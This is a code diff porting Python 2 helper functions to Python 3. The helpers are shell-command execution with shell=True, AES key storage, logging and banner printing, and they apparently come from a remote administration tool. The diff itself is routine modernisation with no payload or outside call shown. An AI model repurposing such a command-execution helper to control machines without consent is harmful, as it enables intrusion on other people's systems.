@@ -17,10 +17,10 @@ import shutil
 import sqlite3
 import zipfile
 import threading
-import cStringIO
+import io
 import contextlib
 import subprocess
-import ConfigParser
+import configparser as ConfigParser
 from time import sleep
 from Crypto import Random
 from getpass import getpass
@@ -49,11 +49,13 @@ else:
 
 if configuration_path not in sys.path:
     sys.path.append(configuration_path)
+if app_path not in sys.path:
+    sys.path.append(app_path)
 
 aes_lib = ConfigParser.ConfigParser()
 aes_lib.read(st_aes_lib)
 if aes_abbrev not in aes_lib.sections():
-    aesfile = open(st_aes_lib,'wb')
+    aesfile = open(st_aes_lib,'w')
     aes_lib.add_section(aes_abbrev)
     aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
     aes_lib.write(aesfile)
@@ -64,13 +66,13 @@ def run_command(command):
         subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         subp_output, errors = subp.communicate()
         if not errors:
-            if subp_output == '':
+            if not subp_output:
                 return '[+] Command successfully executed.\n'
             else:
-                return subp_output
-        return "[!] {}".format(errors)
+                return subp_output.decode('utf-8', errors='replace')
+        return "[!] {}".format(errors.decode('utf-8', errors='replace'))
     except KeyboardInterrupt:
-        print "Terminated command."
+        print("Terminated command.")
 
 def start_command(command):
     try:
@@ -129,7 +131,7 @@ def add_aes(key):
                     if aes_lib.get(aes_abbrev,'aes_key') == key:
                         st_print('[*] The AES key has already been added to this system.\n')
                         return
-                aesfile = open(st_aes_lib,'wb')
+                aesfile = open(st_aes_lib,'w')
                 if not sec_exists:
                     aes_lib.add_section(aes_abbrev)
                 aes_lib.set(aes_abbrev, 'aes_key', key)
@@ -178,7 +180,7 @@ def st_print(text):
             st_log.error(text[9:].strip())
     else:
         text = '\n{}'.format(text)
-        print text
+        print(text)
 
 def print_yellow(string):
     if windows_client(): reinit()
@@ -212,7 +214,7 @@ def get_cwd():
 
 def display_banner():
     clear_screen()
-    print banner
+    print(banner)
 
 def clear_screen():
     if windows_client():
@@ -225,7 +227,7 @@ def check_int(val):
         is_int = int(val)
         return True
     except ValueError:
-        print "{} is not a valid number.".format(val)
+        print("{} is not a valid number.".format(val))
         return False
 
 def append_slash_if_dir(p):
@@ -344,7 +346,7 @@ class progress_bar():
         sys.stdout.flush()
 
 def print_border(length,border):
-    print border * length
+    print(border * length)
 
 def st_logger(resp,log_path,log_name,verbose=True):
     if no_error(resp):
@@ -364,13 +366,13 @@ def nostdout():
     '''Prevent print to stdout, but if there was an error then catch it and
     print the output before raising the error.'''
     saved_stdout = sys.stdout
-    sys.stdout = cStringIO.StringIO()
+    sys.stdout = io.StringIO()
     try:
         yield
     except Exception:
         saved_output = sys.stdout
         sys.stdout = saved_stdout
-        print saved_output.getvalue()
+        print(saved_output.getvalue())
         raise
     sys.stdout = saved_stdout
 
